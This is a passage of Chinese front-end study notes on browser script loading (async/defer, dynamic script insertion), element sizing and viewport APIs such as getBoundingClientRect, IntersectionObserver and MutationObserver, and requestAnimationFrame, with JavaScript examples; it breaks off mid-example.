async属性用于在不阻塞页面文档解析的前提下，控制脚本的下载和执行。</p> <p><strong>没有 defer 或 async</strong>，浏览器会立即加载并执行指定的脚本，<strong>也就是说不等待后续载入的文档元素，读到就加载并执行。</strong></p> <ul><li>async属性： HTML5新增属性，用于<strong>异步下载脚本文件，下载完毕立即解释执行</strong>代码。<strong>异步加载</strong></li> <li>defer属性： <strong>用于开启新的线程下载脚本文件</strong>，并使脚本在文档解析完成后执行。<strong>延迟加载</strong>【推荐】</li> <li>在加载多个JS脚本的时候，<strong>async是无顺序的加载，而defer是有顺序的加载。</strong></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">loadScript</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//动态创建脚本;兼容 IE 方案；</span>
  <span class="token keyword">var</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">&quot;script&quot;</span><span class="token punctuation">)</span>
  script<span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">&quot;text/javascript&quot;</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>script<span class="token punctuation">.</span>readyState<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">//IE</span>
    script<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>script<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token string">&quot;loaded&quot;</span> <span class="token operator">||</span>script<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token string">&quot;complete&quot;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        script<span class="token punctuation">.</span>onreadystatechange <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token comment">//Others: Firefox, Safari, Chrome, and Opera</span>
    script<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  script<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>
  document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//appendChild</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">hackZepto</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//示例：动态加载zepto.js脚本</span>
  <span class="token keyword">var</span> ndParent <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">&quot;script&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> ndScript <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">&quot;script&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// ndScript.src = &quot;http://127.0.0.1:8080/dist/zepto.custome-touch.js&quot;;</span>
  ndScript<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">&quot;http://zeptojs.com/zepto.js&quot;</span><span class="token punctuation">;</span>
  ndScript<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>Zepto<span class="token punctuation">)</span><span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;injected&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      window<span class="token punctuation">.</span>$ <span class="token operator">=</span> window<span class="token punctuation">.</span>Zepto<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
  ndParent<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>ndScript<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h4 id="获取盒子宽高几种方式及区别"><a href="#获取盒子宽高几种方式及区别" class="header-anchor">#</a> 获取盒子宽高几种方式及区别</h4> <ul><li><p><code>dom.style.width/height</code> ：这种方式<strong>只能取到dom元素<code>内联样式</code>所设置的宽高</strong>，也就是说如果该节点的样式是在style标签中或外联的CSS文件中设置的话，通过这种方法是获取不到dom的宽高的</p></li> <li><p><code>dom.currentStyle.width/height</code> ：获取渲染后的宽高。<strong>但是仅IE支持</strong></p></li> <li><p><code>window.getComputedStyle(dom).width/height</code> ：<strong>与2原理相似，但是兼容性，通用性更好一些</strong>【推荐】</p></li> <li><p><code>dom.getBoundingClientRect().width/height</code>：计算元素绝对位置，获取到四个元素left,top,width,height</p></li></ul> <p>获取浏览器高度和宽度的兼容性写法：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> w <span class="token operator">=</span> window<span class="token punctuation">.</span>innerWidth <span class="token operator">||</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>clientWidth <span class="token operator">||</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>clientWidth
<span class="token keyword">var</span> h <span class="token operator">=</span> window<span class="token punctuation">.</span>innerHeight<span class="token operator">||</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>clientHeight<span class="token operator">||</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>clientHeight

 <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleSindowResize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">$</span><span class="token punctuation">(</span>window<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleSindowResize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token function-variable function">handleSindowResize</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">params</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> table <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.ant-table-body'</span><span class="token punctuation">)</span>
    <span class="token keyword">const</span> bodyHeight <span class="token operator">=</span> window<span class="token punctuation">.</span>innerHeight<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">{</span>
      table<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>height <span class="token operator">=</span> bodyHeight <span class="token operator">-</span> <span class="token number">255</span> <span class="token operator">+</span> <span class="token string">'px'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token punctuation">{</span>clientHeight<span class="token punctuation">,</span> clientWidth<span class="token punctuation">}</span> <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByClassName</span><span class="token punctuation">(</span>styles<span class="token punctuation">.</span>autoSize<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

@<span class="token function">debounce</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span>
<span class="token function">resize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> height <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByClassName</span><span class="token punctuation">(</span>styles<span class="token punctuation">.</span>partition<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>offsetHeight<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> height<span class="token operator">:</span> height <span class="token operator">-</span> <span class="token number">49</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h4 id="几个核心视图api"><a href="#几个核心视图api" class="header-anchor">#</a> 几个核心视图API</h4> <h5 id="getboundingclientrect"><a href="#getboundingclientrect" class="header-anchor">#</a> getBoundingClientRect</h5> <p>Element.getBoundingClientRect() <code>方法返回元素的大小及其相对于视口的位置。返回的是一个对象，对象里有这8个属性：</code>left，right，top，bottom，width，height，x，y；</p> <p><img src="/rat-summ/assets/img/image-20211110105748247.335e1440.png" alt="image-20211110105748247"></p> <p><strong>判断元素是否在可视区域</strong></p> <p>这是<code>getBoundingClientRect</code>最常应用的场景了，判断一个元素是否完整出现在视口里；</p> <p>根据这个用处，咱们可以实现：<strong>懒加载和无限滚动</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// html</span>
<span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">&quot;box&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
body <span class="token punctuation">{</span>
  height<span class="token operator">:</span> <span class="token number">3000</span>px<span class="token punctuation">;</span>
  width<span class="token operator">:</span> <span class="token number">3000</span>px<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
#box <span class="token punctuation">{</span>
width<span class="token operator">:</span> <span class="token number">300</span>px<span class="token punctuation">;</span>
height<span class="token operator">:</span> <span class="token number">300</span>px<span class="token punctuation">;</span>
background<span class="token operator">-</span>color<span class="token operator">:</span> red<span class="token punctuation">;</span>
margin<span class="token operator">-</span>top<span class="token operator">:</span> <span class="token number">300</span>px<span class="token punctuation">;</span>
margin<span class="token operator">-</span>left<span class="token operator">:</span> <span class="token number">300</span>px<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// js</span>
<span class="token keyword">const</span> box <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'box'</span><span class="token punctuation">)</span>
window<span class="token punctuation">.</span><span class="token function-variable function">onscroll</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// box完整出现在视口里才会输出true，否则为false</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">checkInView</span><span class="token punctuation">(</span>box<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">checkInView</span><span class="token punctuation">(</span><span class="token parameter">dom</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">{</span> top<span class="token punctuation">,</span> left<span class="token punctuation">,</span> bottom<span class="token punctuation">,</span> right <span class="token punctuation">}</span> <span class="token operator">=</span> dom<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> left<span class="token punctuation">,</span> bottom<span class="token punctuation">,</span> right<span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>innerHeight<span class="token punctuation">,</span> window<span class="token punctuation">.</span>innerWidth<span class="token punctuation">)</span>
  <span class="token keyword">return</span> top <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span>
    left <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span>
    bottom <span class="token operator">&lt;=</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>innerHeight <span class="token operator">||</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>clientHeight<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
    right <span class="token operator">&lt;=</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>innerWidth <span class="token operator">||</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>clientWidth<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br></div></div><p><strong>缺点</strong></p> <ul><li>1、每次scroll都得重新计算，性能耗费大</li> <li>2、引起<code>重绘回流</code></li></ul> <h5 id="intersectionobserver"><a href="#intersectionobserver" class="header-anchor">#</a> IntersectionObserver</h5> <p><code>IntersectionObserver</code><strong>接口</strong> 提供了一种异步观察目标元素与其祖先元素或顶级文档视窗(<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Viewport" target="_blank" rel="noopener noreferrer">viewport<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>)交叉状态的方法。祖先元素与视窗(<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Viewport" target="_blank" rel="noopener noreferrer">viewport<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>)被称为<strong>根(root)</strong></p> <p>通俗点说就是：<code>IntersectionObserver</code>是用来监听<strong>某个元素与视口</strong>的<code>交叉状态</code>的。交叉状态是什么呢？请看下图，一开始整个元素都在视口内，那么元素与视口的交叉状态就是<strong>100%</strong>，而我往下滚动，元素只有一半显示在视口里，那么元素与视口的交叉状态为<strong>50%</strong>：</p> <p><img src="/rat-summ/assets/img/image-20211110110333176.c998c0f1.png" alt="image-20211110110333176"></p> <p><strong>用法</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 接收两个参数 callback  option</span>
<span class="token keyword">var</span> io <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">IntersectionObserver</span><span class="token punctuation">(</span>callback<span class="token punctuation">,</span> option<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 开始观察(可观察多个元素)</span>
io<span class="token punctuation">.</span><span class="token function">observe</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'example1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
io<span class="token punctuation">.</span><span class="token function">observe</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'example2'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 停止观察某个元素</span>
io<span class="token punctuation">.</span><span class="token function">unobserve</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 关闭观察器</span>
io<span class="token punctuation">.</span><span class="token function">disconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h5 id="mutationobserver"><a href="#mutationobserver" class="header-anchor">#</a> MutationObserver</h5> <p><code>MutationObserver</code> 是一个内建对象，它观察 DOM 元素，并在检测到更改时触发回调。</p> <p><strong>用法</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 选择需要观察变动的节点</span>
<span class="token keyword">const</span> targetNode <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'some-id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 观察器的配置（需要观察什么变动）</span>
<span class="token keyword">const</span> config <span class="token operator">=</span> <span class="token punctuation">{</span> attributes<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> childList<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> subtree<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// 当观察到变动时执行的回调函数</span>
<span class="token keyword">const</span> <span class="token function-variable function">callback</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">mutationsList<span class="token punctuation">,</span> observer</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Use traditional 'for loops' for IE 11</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> mutation <span class="token keyword">of</span> mutationsList<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>mutation<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token string">'childList'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'A child node has been added or removed.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>mutation<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token string">'attributes'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'The '</span> <span class="token operator">+</span> mutation<span class="token punctuation">.</span>attributeName <span class="token operator">+</span> <span class="token string">' attribute was modified.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// 创建一个观察器实例并传入回调函数</span>
<span class="token keyword">const</span> observer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MutationObserver</span><span class="token punctuation">(</span>callback<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 以上述配置开始观察目标节点</span>
observer<span class="token punctuation">.</span><span class="token function">observe</span><span class="token punctuation">(</span>targetNode<span class="token punctuation">,</span> config<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 之后，可停止观察</span>
observer<span class="token punctuation">.</span><span class="token function">disconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><h5 id="createnodeiterator"><a href="#createnodeiterator" class="header-anchor">#</a> createNodeIterator</h5> <blockquote><h4 id="说一说-如何遍历输出页面中的所有元素"><a href="#说一说-如何遍历输出页面中的所有元素" class="header-anchor">#</a> 说一说，如何遍历输出页面中的所有元素</h4></blockquote> <p>那如何使用<code>createNodeIterator</code>对页面中所有元素进行遍历输出呢？</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> body <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token keyword">const</span> it <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createNodeIterator</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span>
<span class="token keyword">let</span> root <span class="token operator">=</span> it<span class="token punctuation">.</span><span class="token function">nextNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">while</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
  root <span class="token operator">=</span> it<span class="token punctuation">.</span><span class="token function">nextNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h5 id="createdocumentfragment"><a href="#createdocumentfragment" class="header-anchor">#</a> createDocumentFragment</h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> ul <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'list'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> fg <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createDocumentFragment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  li <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'li'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  li<span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">'item '</span> <span class="token operator">+</span> <span class="token punctuation">(</span>done <span class="token operator">*</span> size <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
  fg<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>li<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
ul<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>fg<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h4 id="requestanimationframe【raf-要点】"><a href="#requestanimationframe【raf-要点】" class="header-anchor">#</a> requestAnimationFrame【rAF 要点】</h4> <p>传统的 <code>javascript</code> 动画是通过定时器 <code>setTimeout</code> 或者 <code>setInterval</code> 实现的。但是定时器动画一直存在两个问题，</p> <ul><li>第一个就是动画的循时间环间隔不好确定，设置长了动画显得不够平滑流畅，设置短了浏览器的重绘频率会达到瓶颈，推荐的最佳循环间隔是17ms（大多数电脑的显示器刷新频率是60Hz，1000ms/60）；</li> <li>第二个问题是定时器第二个时间参数只是指定了多久后将动画任务添加到浏览器的UI线程队列中，如果UI线程处于忙碌状态，那么动画不会立刻执行。</li></ul> <p>为了解决这些问题，HTML5 中加入了 <code>requestAnimationFrame</code>;</p> <h5 id="优点"><a href="#优点" class="header-anchor">#</a> 优点</h5> <ol><li><code>requestAnimationFrame</code> 会把每一帧中的所有 DOM 操作集中起来，<strong>在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率;</strong></li> <li>在隐藏或不可见的元素中，<code>requestAnimationFrame</code> 将不会进行重绘或回流，这当然就意味着更少的 CPU、GPU 和内存使用量</li> <li><code>requestAnimationFrame</code> 是由浏览器专门为动画提供的 API，在运行时浏览器会自动优化方法的调用，并且如果页面不是激活状态下的话，动画会自动暂停，有效节省了 CPU 开销</li></ol> <h5 id="场景"><a href="#场景" class="header-anchor">#</a> 场景</h5> <h6 id="js动画"><a href="#js动画" class="header-anchor">#</a> js动画</h6> <p><code>requestAnimationFrame</code> 本来就是为动画而生的，所以在处理 js 动画不在话下，与定时器的用法非常相似;</p> <p>下面是一个例子，点击元素时开始转动，再次点击转动速速增加。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> deg <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> id<span class="token punctuation">;</span>
<span class="token keyword">var</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;div&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
div<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
